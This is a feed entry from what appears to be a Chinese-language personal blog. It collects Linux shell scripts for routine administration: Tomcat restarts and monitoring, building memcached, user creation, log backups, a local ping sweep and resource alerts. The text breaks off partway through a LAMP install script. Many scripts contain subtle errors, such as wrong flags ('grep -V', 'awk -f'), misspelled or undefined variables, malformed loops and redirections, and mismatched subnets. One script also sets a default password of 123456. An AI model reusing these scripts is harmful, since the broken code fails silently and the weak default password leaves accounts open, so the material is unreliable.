    <id>https://marnm.github.io//posts/f42b90f9/</id>
    <published>2022-06-07T04:52:33.000Z</published>
    <updated>2022-06-07T05:04:06.600Z</updated>
    
    <content type="html"><![CDATA[<p><strong>&#x67E5;&#x770B;&#x6709;&#x591A;&#x5C11;&#x8FDC;&#x7A0B;&#x7684;IP&#x5728;&#x8FDE;&#x63A5;&#x672C;&#x673A;</strong><br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line">netstat -atn | awk <span class="string">&apos;{print $5}&apos;</span> | awk <span class="string">&apos;{print $1}&apos;</span> | sort -nr | uniq -c</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>Get Tomcat PID</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">v1=&quot;Hello&quot;</span><br><span class="line">v2=&quot;world&quot;</span><br><span class="line">v3=${v1}${v2}</span><br><span class="line">echo $v3</span><br><span class="line"></span><br><span class="line">pidlist=`ps -ef|grep apache-tomcat-7.0.75|grep -v &quot;grep&quot;|awk &apos;{print $2}&apos;`</span><br><span class="line">echo $pidlist</span><br><span class="line">echo &quot;tomcat id list :$pidlist&quot;  # &#x663E;&#x793A;PID</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x6E90;&#x7801;&#x5B89;&#x88C5;memcached</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x4E00;&#x952E;&#x90E8;&#x7F72;memcached</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x811A;&#x672C;&#x7528;&#x6E90;&#x7801;&#x6765;&#x5B89;&#x88C5;memcached&#x670D;&#x52A1;&#x5668;</span></span><br><span class="line">wget http://www.memcached.org/files/memcached-1.5.1.tar.gz</span><br><span class="line">yum -y install gcc</span><br><span class="line">tar -xf memcached-1.5.1.tar.gz</span><br><span class="line">cd memcached-1.5.1</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x68C0;&#x6D4B;&#x5F53;&#x524D;&#x7528;&#x6237;&#x662F;&#x5426;&#x4E3A;&#x7BA1;&#x7406;&#x5458;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x68C0;&#x6D4B;&#x672C;&#x673A;&#x5F53;&#x524D;&#x7528;&#x6237;&#x662F;&#x5426;&#x4E3A;&#x8D85;&#x7EA7;&#x7BA1;&#x7406;&#x5458;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x7BA1;&#x7406;&#x5458;&#xFF0C;&#x5219;&#x4F7F;&#x7528;yum&#x5B89;&#x88C5;vsftpd&#xFF0C;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x5982;&#x679C;&#x4E0D;&#x662F;&#xFF0C;&#x5219;&#x63D0;&#x793A;&#x60A8;&#x975E;&#x7BA1;&#x7406;&#x5458;&#x7528;&#x6237;</span></span><br><span class="line">if [ $USER == &quot;root&quot; ]</span><br><span class="line">then</span><br><span class="line">yum -y install vsftpd</span><br><span class="line">else</span><br><span class="line">echo &quot;&#x60A8;&#x4E0D;&#x662F;&#x7BA1;&#x7406;&#x5458;&#xFF0C;&#x6CA1;&#x6709;&#x6743;&#x9650;&#x5B89;&#x88C5;&#x8F6F;&#x4EF6;&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x6740;&#x6389;tomcat&#x5E76;&#x91CD;&#x65B0;&#x542F;&#x52A8;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">kill</span> tomcat pid</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x627E;&#x5230;tomcat&#x7684;PID</span></span><br><span class="line">pidlist=`ps -ef|grep apache-tomcat-7.0.75|grep -V &quot;grep&quot;|awk &apos;{print $2}&apos;`</span><br><span class="line"></span><br><span class="line">echo &quot;tomcat ID LIST : $pidlist&quot;</span><br><span class="line"></span><br><span class="line">kill -9 $pidlist</span><br><span class="line"></span><br><span class="line">echo &quot;KILL $pidlist:&quot;</span><br><span class="line">echo &quot;service stop success&quot;</span><br><span class="line">echo &quot;start tomcat&quot;</span><br><span class="line"></span><br><span class="line">cd /opt/apache-tomcat-7.0.75</span><br><span class="line">pwd</span><br><span class="line">rm -rf work/*</span><br><span class="line">cd bin</span><br><span class="line">./startup.sh</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x7EDF;&#x8BA1;&#x5F53;&#x524D;&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#x7684;&#x7528;&#x6237;&#x6570;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x7EDF;&#x8BA1;&#x5F53;&#x524D;Linux&#x7CFB;&#x7EDF;&#x4E2D;&#x53EF;&#x4EE5;&#x767B;&#x5F55;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x8D26;&#x6237;&#x6709;&#x591A;&#x5C11;&#x4E2A;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x65B9;&#x6CD5;1&#xFF1B;</span></span><br><span class="line">grep &quot;bash$&quot; /etc/passwd | wc -l</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x65B9;&#x6CD5;2&#xFF1B;</span></span><br><span class="line">awk -f : &apos;/bash$/{x++}end{print x}&apos; /etc/passwd</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x5907;&#x4EFD;MySQL&#x8868;&#x6570;&#x636E;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br><span class="line">dbName=mysql</span><br><span class="line">tableName=db</span><br><span class="line"></span><br><span class="line">echo [`date+&apos;%Y-%m-%d %H:%M:%S&apos;`]&apos; start loading data....&apos;</span><br><span class="line">mysql -uroot -P3306 ${ddbName} -e &quot;LOAD DATA LOCAL INFILE &apos;# /home/wenmin/wenxing.txt&apos; INTO TABLE ${tableName} FIELDS TERMINATED BY &apos;;&apos;&quot;</span><br><span class="line">echo [`date +&apos;%Y-%m-%d %H:%M:%S&apos;`]&apos;end loading data...&apos;</span><br><span class="line">exit</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x4F7F;&#x7528;&#x6B7B;&#x5FAA;&#x73AF;&#x5B9E;&#x65F6;&#x663E;&#x793A;eth0&#x7F51;&#x5361;&#x53D1;&#x9001;&#x7684;&#x6570;&#x636E;&#x5305;&#x6D41;&#x91CF;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x4F7F;&#x7528;&#x6B7B;&#x5FAA;&#x73AF;&#x5B9E;&#x65F6;&#x663E;&#x793A;eth0&#x7F51;&#x5361;&#x53D1;&#x9001;&#x7684;&#x6570;&#x636E;&#x5305;&#x6D41;&#x91CF;</span></span><br><span class="line"></span><br><span class="line">while :</span><br><span class="line">do</span><br><span class="line">echo &apos;&#x672C;&#x5730;&#x7F51;&#x5361; eth0 &#x6D41;&#x91CF;&#x4FE1;&#x606F;&#x5982;&#x4E0B;&#xFF1A;&apos;</span><br><span class="line">ifconfig eth0 | grep &quot;RX pack&quot; | awk &apos;{print $5}&apos;</span><br><span class="line">ifconfig eth0 | grep &quot;TX pack&quot; | awk &apos;{print $5}&apos;</span><br><span class="line">done</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x6D4B;&#x8BD5;192.168.4.0/24&#x6574;&#x4E2A;&#x7F51;&#x6BB5;&#x4E2D;&#x54EA;&#x4E9B;&#x4E3B;&#x673A;&#x5904;&#x4E8E;&#x5F00;&#x673A;&#x72B6;&#x6001;&#xFF0C;&#x54EA;&#x4E9B;&#x4E3B;&#x673A;&#x5904;&#x4E8E;&#x5173;&#x673A;&#x72B6;&#x6001;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">for i in {1..254}</span><br><span class="line">do</span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x6BCF;&#x9694;0.3&#x79D2;ping&#x4E00;&#x6B21;&#xFF0C;&#x4E00;&#x5171;ping2&#x6B21;&#xFF0C;&#x5E76;&#x4EE5;1&#x6BEB;&#x79D2;&#x4E3A;&#x5355;&#x4F4D;&#x8BBE;&#x7F6E;ping&#x7684;&#x8D85;&#x65F6;&#x65F6;&#x95F4;</span></span><br><span class="line">ping -c 2 -i 0.3 -W 1 192.168.1.$i $&gt; /dev/null</span><br><span class="line">if [ $? -eq 0 ]; then</span><br><span class="line">echo &quot;192.168.4.$i is up&quot;</span><br><span class="line">else</span><br><span class="line">echo &quot;192.168.168.4.$i is down&quot;</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x63D0;&#x793A;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x811A;&#x672C;&#x81EA;&#x52A8;&#x521B;&#x5EFA;&#x76F8;&#x5E94;&#x7684;&#x8D26;&#x6237;&#x53CA;&#x914D;&#x7F6E;&#x5BC6;&#x7801;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x7F16;&#x5199;&#x811A;&#x672C;&#xFF1A;&#x63D0;&#x793A;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x811A;&#x672C;&#x81EA;&#x52A8;&#x521B;&#x5EFA;&#x76F8;&#x5E94;&#x7684;&#x8D26;&#x6237;&#x53CA;&#x914D;&#x7F6E;&#x5BC6;&#x7801;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x5982;&#x679C;&#x7528;&#x6237;&#x4E0D;&#x8F93;&#x5165;&#x8D26;&#x6237;&#x540D;&#xFF0C;&#x5219;&#x63D0;&#x793A;&#x5FC5;&#x987B;&#x8F93;&#x5165;&#x8D26;&#x6237;&#x540D;&#x5E76;&#x9000;&#x51FA;&#x811A;&#x672C;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x5982;&#x679C;&#x7528;&#x6237;&#x4E0D;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#xFF0C;&#x5219;&#x7EDF;&#x4E00;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x7684;123456&#x4F5C;&#x4E3A;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;</span></span><br><span class="line"></span><br><span class="line">read -p &quot;&#x8BF7;&#x8F93;&#x5165;&#x7528;&#x6237;&#x540D;&#xFF1A;&quot; user</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x4F7F;&#x7528;-z&#x53EF;&#x4EE5;&#x5224;&#x65AD;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#x662F;&#x5426;&#x4E3A;&#x7A7A;&#xFF0C;&#x5982;&#x679C;&#x4E3A;&#x7A7A;&#xFF0C;&#x63D0;&#x793A;&#x7528;&#x6237;&#x5FC5;&#x987B;&#x8F93;&#x5165;&#x8D26;&#x6237;&#x540D;&#xFF0C;&#x5E76;&#x9000;&#x51FA;&#x811A;&#x672C;&#xFF0C;&#x9000;&#x51FA;&#x7801;&#x4E3A;2</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x6CA1;&#x6709;&#x8F93;&#x5165;&#x7528;&#x6237;&#x540D;&#x811A;&#x672C;&#x9000;&#x51FA;&#x540E;&#xFF0C;&#x4F7F;&#x7528;$?&#x67E5;&#x770B;&#x7684;&#x8FD4;&#x56DE;&#x7801;&#x4E3A;2</span></span><br><span class="line"></span><br><span class="line">if [ -z $user ]; then</span><br><span class="line">echo &quot; &#x60A8;&#x5FC5;&#x987B;&#x8F93;&#x5165;&#x8D26;&#x6237;&#x540D;&quot;</span><br><span class="line">exit 2</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x4F7F;&#x7528;stty -<span class="built_in">echo</span>&#x5173;&#x95ED;shell&#x7684;&#x56DE;&#x663E;&#x529F;&#x80FD;</span></span><br><span class="line">stty -echo</span><br><span class="line">read -p &quot;&#x8BF7;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#xFF1A;&quot;pass</span><br><span class="line">stty echo</span><br><span class="line"></span><br><span class="line">pass=${pass:-123456}</span><br><span class="line">useradd &quot;$user&quot;</span><br><span class="line">echo &quot;$pass&quot; | passwd --stdin &quot;$user&quot;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x6BCF;&#x5468;5&#x4F7F;&#x7528;tar&#x547D;&#x4EE4;&#x5907;&#x4EFD;/var/log&#x4E0B;&#x7684;&#x6240;&#x6709;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x6BCF;&#x5468; 5 &#x4F7F;&#x7528; tar &#x547D;&#x4EE4;&#x5907;&#x4EFD;/var/<span class="built_in">log</span> &#x4E0B;&#x7684;&#x6240;&#x6709;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> vim  /root/logbak.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x7F16;&#x5199;&#x5907;&#x4EFD;&#x811A;&#x672C;,&#x5907;&#x4EFD;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x5305;&#x542B;&#x65E5;&#x671F;&#x6807;&#x7B7E;,&#x9632;&#x6B62;&#x540E;&#x9762;&#x7684;&#x5907;&#x4EFD;&#x5C06;&#x524D;&#x9762;&#x7684;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x8986;&#x76D6;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x6CE8;&#x610F; date &#x547D;&#x4EE4;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x53CD;&#x5F15;&#x53F7;&#x62EC;&#x8D77;&#x6765;,&#x53CD;&#x5F15;&#x53F7;&#x5728;&#x952E;&#x76D8;&lt;tab&gt;&#x952E;&#x4E0A;&#x9762;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tar -czf log-`date +%Y%m%d`.tar.gz /var/log</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> crontab -e <span class="comment">#&#x7F16;&#x5199;&#x8BA1;&#x5212;&#x4EFB;&#x52A1;&#xFF0C;&#x6267;&#x884C;&#x5907;&#x4EFD;&#x811A;&#x672C;</span></span></span><br><span class="line">00 03 * * 5 /home/wenming/datas/logbak.sh</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x5B9A;&#x4E49;&#x8981;&#x76D1;&#x63A7;&#x7684;&#x9875;&#x9762;&#x5730;&#x5740;&#xFF0C;&#x5BF9; tomcat &#x72B6;&#x6001;&#x8FDB;&#x884C;&#x91CD;&#x542F;&#x6216;&#x7EF4;&#x62A4;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">function</span>:&#x81EA;&#x52A8;&#x76D1;&#x63A7;tomcat&#x8FDB;&#x7A0B;&#xFF0C;&#x6302;&#x4E86;&#x5C31;&#x6267;&#x884C;&#x91CD;&#x542F;&#x64CD;&#x4F5C;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> author&#xFF1A;huanghong</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> DEFINE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x83B7;&#x53D6;tomcat PPID</span></span><br><span class="line">tomcatID=$(ps -ef |grep tomcat | grep -w &apos;apache-tomcat-7.0.75&apos; |grep -v &apos;grep&apos; |awk &apos;{print $2}&apos;)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> tomcat_startup</span></span><br><span class="line">StartTomcat=/opt/apache-tomcat-7.0.75/bin/startup.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> TomcatCache=/user/apache-tomcat-5.5.23/work</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">&#x5B9A;&#x4E49;&#x8981;&#x76D1;&#x63A7;&#x7684;&#x9875;&#x9762;&#x5730;&#x5740;</span></span><br><span class="line">WebURL=http://192.168.242.113:8080/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x65E5;&#x5FD7;&#x8F93;&#x51FA;</span></span><br><span class="line">GetPageInfo=/dev/null</span><br><span class="line">TomcatMonitorLog=/tmp/TomcatMonitor.log</span><br><span class="line"></span><br><span class="line">Monitor() {</span><br><span class="line">echo &quot;[info]&#x5F00;&#x59CB;&#x76D1;&#x63A7;tomcat...[$(date +&apos;%F %H:%M:%S&apos;)]&quot;</span><br><span class="line">if [$TomcatID]</span><br><span class="line">then</span><br><span class="line">echo &quot;[info]tomcat&#x8FDB;&#x7A0B;ID&#x4E3A;:$tomcatID.&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x83B7;&#x53D6;&#x8FD4;&#x56DE;&#x72B6;&#x6001;&#x7801;</span></span><br><span class="line">TomcatServiceCode=$(curl -s -o $GetPageInfo -m 10 --connect-timeout 10 $WebURL -w %{http_code})</span><br><span class="line">if [ $TomcatServiceCode -eq 200 ]; then</span><br><span class="line">echo &quot;&quot;[info]&#x8FD4;&#x56DE;&#x7801;&#x4E3A;$TomcatServiceCode,tomcat&#x542F;&#x52A8;&#x6210;&#x529F;,&#x9875;&#x9762;&#x6B63;&#x5E38;.&quot;&quot;</span><br><span class="line">else</span><br><span class="line">echo &quot;[error]&#x8BBF;&#x95EE;&#x51FA;&#x9519;&#xFF0C;&#x72B6;&#x6001;&#x7801;&#x4E3A;$TomcatServiceCode,&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x5DF2;&#x8F93;&#x51FA;&#x5230;$GetPageInfo&quot;  </span><br><span class="line">echo &quot;[error]&#x5F00;&#x59CB;&#x91CD;&#x542F;tomcat&quot; </span><br><span class="line">kill -9 $tomcatID # &#x6740;&#x6389;tomcat&#x8FDB;&#x7A0B;</span><br><span class="line">sleep 3</span><br><span class="line"><span class="meta">#</span><span class="bash"> rm -rf <span class="variable">$TomcatCache</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">StartTomcat</span></span><br><span class="line">fi</span><br><span class="line">else</span><br><span class="line">echo &quot;[error]&#x8FDB;&#x7A0B;&#x4E0D;&#x5B58;&#x5728;&#xFF01;tomcat&#x81EA;&#x52A8;&#x91CD;&#x542F;...&quot;</span><br><span class="line">echo &quot;[info]$StartTomcat, &#x8BF7;&#x7A0D;&#x4FAF;.......&quot;</span><br><span class="line"><span class="meta">$</span><span class="bash">StartTomcat</span></span><br><span class="line">fi</span><br><span class="line">echo &quot;---------------------------------------&quot;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">Monitor &gt;&gt; $TomCatMonitorLog</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x901A;&#x8FC7;&#x4F4D;&#x7F6E;&#x53D8;&#x91CF;&#x521B;&#x5EFA;Linux&#x7CFB;&#x7EDF;&#x8D26;&#x6237;&#x53CA;&#x5BC6;&#x7801;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x901A;&#x8FC7;&#x4F4D;&#x7F6E;&#x53D8;&#x91CF;&#x521B;&#x5EFA;Linux&#x7CFB;&#x7EDF;&#x8D26;&#x6237;&#x53CA;&#x5BC6;&#x7801;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="variable">$1</span>&#x662F;&#x6267;&#x884C;&#x811A;&#x672C;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;<span class="variable">$2</span>&#x662F;&#x6267;&#x884C;&#x811A;&#x672C;&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;</span></span><br><span class="line"></span><br><span class="line">useradd &quot;$1&quot;</span><br><span class="line">echo &quot;$2&quot; | passwd --stdin &quot;$1&quot;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x5B9E;&#x65F6;&#x76D1;&#x63A7;&#x672C;&#x673A;&#x5185;&#x5B58;&#x548C;&#x786C;&#x76D8;&#x5269;&#x4F59;&#x7A7A;&#x95F4;,&#x5269;&#x4F59;&#x5185;&#x5B58;&#x5C0F;&#x4E8E;500M&#x3001;&#x6839;&#x5206;&#x533A;&#x5269;&#x4F59;&#x7A7A;&#x95F4;&#x5C0F;&#x4E8E;1000M&#x65F6;,&#x53D1;&#x9001;&#x62A5;&#x8B66;&#x90AE;&#x4EF6;&#x7ED9;root&#x7BA1;&#x7406;&#x5458;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x5B9E;&#x65F6;&#x76D1;&#x63A7;&#x672C;&#x673A;&#x5185;&#x5B58;&#x548C;&#x786C;&#x76D8;&#x5269;&#x4F59;&#x7A7A;&#x95F4;,&#x5269;&#x4F59;&#x5185;&#x5B58;&#x5C0F;&#x4E8E;500M&#x3001;&#x6839;&#x5206;&#x533A;&#x5269;&#x4F59;&#x7A7A;&#x95F4;&#x5C0F;&#x4E8E;1000M&#x65F6;,&#x53D1;&#x9001;&#x62A5;&#x8B66;&#x90AE;&#x4EF6;&#x7ED9;root&#x7BA1;&#x7406;&#x5458;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x63D0;&#x53D6;&#x6839;&#x5206;&#x533A;&#x5269;&#x4F59;&#x7A7A;&#x95F4;</span></span><br><span class="line">dis_sike=$(free | awk &apos;/Mem/{print $4}&apos;)</span><br><span class="line">while:</span><br><span class="line">do</span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x6CE8;&#x610F;&#x5185;&#x5B58;&#x548C;&#x78C1;&#x76D8;&#x63D0;&#x53D6;&#x7A7A;&#x95F4;&#x5927;&#x5C0F;&#x90FD;&#x662F;&#x4EE5;kb&#x4E3A;&#x5355;&#x4F4D;</span></span><br><span class="line">if [ $disk_size -le 512000 -a $mem_size -le 1024000 ]</span><br><span class="line">then</span><br><span class="line">mail -s &quot;Warning&quot; root &lt;&lt;EOF</span><br><span class="line">Insufficient resource,&#x8D44;&#x6E90;&#x4E0D;&#x8DB3;</span><br><span class="line">EOF</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x4E00;&#x952E;&#x90E8;&#x7F72;LAMP&#xFF08;rpm&#xFF09;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x4E00;&#x952E;&#x90E8;&#x7F72; LNMP(RPM &#x5305;&#x7248;&#x672C;)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x4F7F;&#x7528; yum 